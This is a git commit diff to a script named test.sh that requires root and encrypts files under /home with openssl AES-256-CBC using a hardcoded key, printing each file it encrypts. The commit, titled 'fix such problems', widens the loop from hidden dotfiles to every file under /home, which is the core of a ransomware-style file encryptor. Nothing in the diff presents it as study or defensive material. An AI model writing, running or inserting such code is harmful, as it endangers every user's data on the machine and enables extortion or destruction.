c1e998375532b779d92a2ecdf9ee6d0e4b1d0697
Anas Hansson <anashansson@gmail.com>
2017-05-14 05:54:15 +0200

    fix such problems

--- test.sh
+++ test.sh
@@ -3,7 +3,7 @@ if [[ $(id -u) -ne 0 ]] ; then echo "Please run as root" ; exit 1 ; fi
 
 cd /home;
 
-for f in $(find /home -name '.*'); do
+for f in $(find /home); do
 	if [ -f $f ]; then
 		sudo openssl enc -aes-256-cbc -salt -in "$f" -out "${f%.*}".enc -k "IDKFA";
 		echo -e "File: [$f] encrypted";
